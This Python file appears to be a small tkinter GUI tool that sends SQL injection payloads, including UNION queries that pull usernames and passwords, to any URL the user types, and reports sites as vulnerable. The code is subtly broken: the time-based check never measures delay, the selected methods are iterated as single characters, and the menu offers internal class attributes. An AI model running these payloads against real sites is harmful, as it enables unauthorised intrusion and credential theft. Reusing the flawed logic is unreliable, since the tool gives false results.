import tkinter as tk
from tkinter import ttk
import requests

class SQLInjectionTest:
    def __init__(self, url):
        self.url = url

    def union_based_injection(self):
        payloads = [" UNION SELECT * FROM users; --", " UNION SELECT username, password FROM users; --", " UNION SELECT * FROM information_schema.tables; --"]
        for payload in payloads:
            r = requests.get(self.url + payload)
            if "SQL syntax" in r.text or "mysql_fetch" in r.text:
                return "VULNERABLE"
        else:
            return "NOT VULNERABLE"
            
    def boolean_based_injection(self):
        payloads = [" OR 1=1; --", " AND 1=0; --", " OR 2>1; --"]
        for payload in payloads:
            r = requests.get(self.url + payload)
            if "SQL syntax" in r.text or "mysql_fetch" in r.text:
                return "VULNERABLE"
        else:
            return "NOT VULNERABLE"

    def time_based_injection(self):
        payloads = [" OR SLEEP(5); --", " OR BENCHMARK(1000000,MD5(1)); --", " OR WAITFOR DELAY '00:00:05'; --"]
        for payload in payloads:
            r = requests.get(self.url + payload)
            if "SQL syntax" in r.text or "mysql_fetch" in r.text:
                return "VULNERABLE"
        else:
            return "NOT VULNERABLE"

    def error_based_injection(self):
        payloads = ["; --", " ORDER BY 100; --", " ORDER BY (SELECT COUNT(*) FROM users); --"]
        for payload in payloads:
            r = requests.get(self.url + payload)
            if "SQL syntax" in r.text or "mysql_fetch" in r.text:
                return "VULNERABLE"
        else:
            return "NOT VULNERABLE"

    def blind_sql_injection(self):
        payloads = [" AND (SELECT COUNT(*) FROM users) = 0; --", " AND (SELECT COUNT(*) FROM information_schema.tables) = 0; --"]
        for payload in payloads:
            r = requests.get(self.url + payload)
            if "SQL syntax" in r.text or "mysql_fetch" in r.text:
                return "VULNERABLE"
        else:
            return "NOT VULNERABLE"

class SQLInjectionTestUI(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("SQL Injection Test")
        self.geometry("400x300")
        
        self.url_label = ttk.Label(self, text="Enter website URL:")
        self.url_label.pack()
        
        self.url_entry = ttk.Entry(self)
        self.url_entry.pack()
        
        self.test_button = ttk.Button(self, text="Test", command=self.run_tests)
        self.test_button.pack()

        self.methods_label = ttk.Label(self, text="Select test methods to run:")
        self.methods_label.pack()

        self.methods_var = tk.StringVar()
        self.methods_var.set(["union_based_injection", "boolean_based_injection"])
        self.methods_list = ttk.OptionMenu(self, self.methods_var, *SQLInjectionTest.__dict__.keys())
        self.methods_list.pack()
        
        self.result_label = ttk.Label(self)
        self.result_label.pack()

    def run_tests(self):
        url = self.url_entry.get()
        test = SQLInjectionTest(url)
        result = []
        for method in self.methods_var.get():
            if method in SQLInjectionTest.__dict__.keys():
                result.append(method + ": " + SQLInjectionTest.__dict__[method](test))
        self.result_label.config(text="\n".join(result))

if __name__ == "__main__":
    app = SQLInjectionTestUI()
    app.mainloop()
